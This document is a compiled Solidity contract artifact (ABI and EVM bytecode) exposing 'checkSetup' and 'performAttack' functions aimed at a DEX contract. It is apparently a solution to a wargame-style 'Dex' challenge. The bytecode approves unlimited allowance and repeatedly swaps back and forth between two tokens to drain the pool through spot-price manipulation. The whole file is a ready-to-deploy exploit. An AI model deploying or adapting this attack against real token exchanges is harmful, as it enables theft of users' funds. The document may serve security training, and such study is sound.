{"abi":[{"type":"function","name":"checkSetup","inputs":[{"name":"dexAddr","type":"address","internalType":"address"}],"outputs":[{"name":"isSetup","type":"bool","internalType":"bool"},{"name":"token1","type":"address","internalType":"address"},{"name":"token2","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"performAttack","inputs":[{"name":"dexAddr","type":"address","internalType":"address"}],"outputs":[{"name":"success","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50610ca48061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c806325d8207a146100385780639b98289914610060575b5f5ffd5b61004b610046366004610b6b565b61009a565b60405190151581526020015b60405180910390f35b61007361006e366004610b6b565b610953565b6040805193151584526001600160a01b039283166020850152911690820152606001610057565b5f5f8290505f816001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100dc573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101009190610b8d565b90505f826001600160a01b03166325be124e6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561013f573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101639190610b8d565b90506001600160a01b038216158061018257506001600160a01b038116155b1561019157505f949350505050565b6040517f095ea7b30000000000000000000000000000000000000000000000000000000081526001600160a01b038416600482018190525f1960248301529063095ea7b3906044015f604051808303815f87803b1580156101f0575f5ffd5b505af1158015610202573d5f5f3e3d5ffd5b5050604051633de222bb60e21b81526001600160a01b0385811660048301523360248301525f93508616915063f7888aec90604401602060405180830381865afa158015610252573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102769190610ba8565b604051633de222bb60e21b81526001600160a01b0384811660048301523360248301529192505f9186169063f7888aec90604401602060405180830381865afa1580156102c5573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102e99190610ba8565b90505f5b600a81101561085457604051633de222bb60e21b81526001600160a01b0386811660048301528716602482018190525f9163f7888aec90604401602060405180830381865afa158015610342573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103669190610ba8565b604051633de222bb60e21b81526001600160a01b0387811660048301528916602482018190529192505f919063f7888aec90604401602060405180830381865afa1580156103b6573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103da9190610ba8565b90508115806103e7575080155b156103fc575060019998505050505050505050565b604051633de222bb60e21b81526001600160a01b03888116600483015233602483015289169063f7888aec90604401602060405180830381865afa158015610446573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061046a9190610ba8565b604051633de222bb60e21b81526001600160a01b0388811660048301523360248301529196509089169063f7888aec90604401602060405180830381865afa1580156104b8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104dc9190610ba8565b93506104e9600284610bd3565b1580156104f557505f85115b156106905760405163bfd7e00d60e01b81526001600160a01b03888116600483015287811660248301526044820187905286915f918b169063bfd7e00d90606401602060405180830381865afa158015610551573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105759190610ba8565b905082811061061c5760405163bfd7e00d60e01b81526001600160a01b038a811660048301528981166024830152604482018690528593508b169063bfd7e00d90606401602060405180830381865afa1580156105d4573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105f89190610ba8565b90508281111561061c57606461060f856063610bfa565b6106199190610c17565b91505b86821161068957604051630df791e560e41b81526001600160a01b038a811660048301528981166024830152604482018490528b169063df791e50906064015f604051808303815f87803b158015610672575f5ffd5b505af1158015610684573d5f5f3e3d5ffd5b505050505b5050610840565b61069b600284610bd3565b60011480156106a957505f84115b156108405760405163bfd7e00d60e01b81526001600160a01b03878116600483015288811660248301526044820186905285915f918b169063bfd7e00d90606401602060405180830381865afa158015610705573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107299190610ba8565b90508381106107d05760405163bfd7e00d60e01b81526001600160a01b0389811660048301528a81166024830152604482018590528493508b169063bfd7e00d90606401602060405180830381865afa158015610788573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107ac9190610ba8565b9050838111156107d05760646107c3846063610bfa565b6107cd9190610c17565b91505b85821161083d57604051630df791e560e41b81526001600160a01b0389811660048301528a81166024830152604482018490528b169063df791e50906064015f604051808303815f87803b158015610826575f5ffd5b505af1158015610838573d5f5f3e3d5ffd5b505050505b50505b8261084a81610c2a565b93505050506102ed565b604051633de222bb60e21b81526001600160a01b0386811660048301528716602482018190525f9163f7888aec90604401602060405180830381865afa1580156108a0573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108c49190610ba8565b604051633de222bb60e21b81526001600160a01b0387811660048301528916602482018190529192505f919063f7888aec90604401602060405180830381865afa158015610914573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109389190610ba8565b9050811580610945575080155b9a9950505050505050505050565b60408051600481526024810182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167fd21220a70000000000000000000000000000000000000000000000000000000017905290515f91829182918591839182916001600160a01b038516916109cb91610c42565b5f60405180830381855afa9150503d805f8114610a03576040519150601f19603f3d011682016040523d82523d5f602084013e610a08565b606091505b5060408051600481526024810182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167f25be124e0000000000000000000000000000000000000000000000000000000017905290519294509092505f9182916001600160a01b038b1691610a809190610c42565b5f60405180830381855afa9150503d805f8114610ab8576040519150601f19603f3d011682016040523d82523d5f602084013e610abd565b606091505b5091509150838015610acc5750815b8015610ad9575082516020145b8015610ae6575080516020145b15610b3e5782806020019051810190610aff9190610b8d565b965080806020019051810190610b159190610b8d565b95506001600160a01b03871615801590610b3757506001600160a01b03861615155b9750610b48565b5f97505f96505f95505b50505050509193909250565b6001600160a01b0381168114610b68575f5ffd5b50565b5f60208284031215610b7b575f5ffd5b8135610b8681610b54565b9392505050565b5f60208284031215610b9d575f5ffd5b8151610b8681610b54565b5f60208284031215610bb8575f5ffd5b5051919050565b634e487b7160e01b5f52601260045260245ffd5b5f82610be157610be1610bbf565b500690565b634e487b7160e01b5f52601160045260245ffd5b8082028115828204841417610c1157610c11610be6565b92915050565b5f82610c2557610c25610bbf565b500490565b5f60018201610c3b57610c3b610be6565b5060010190565b5f82515f5b81811015610c615760208186018101518583015201610c47565b505f92019182525091905056fea2646970667358221220943cd56bb7314ca82a977dfd5ca3287510dc3b4017de347879722e2226e649f764736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"checkSetup(address)":"9b982899","performAttack(address)":"25d8207a"},"id":0}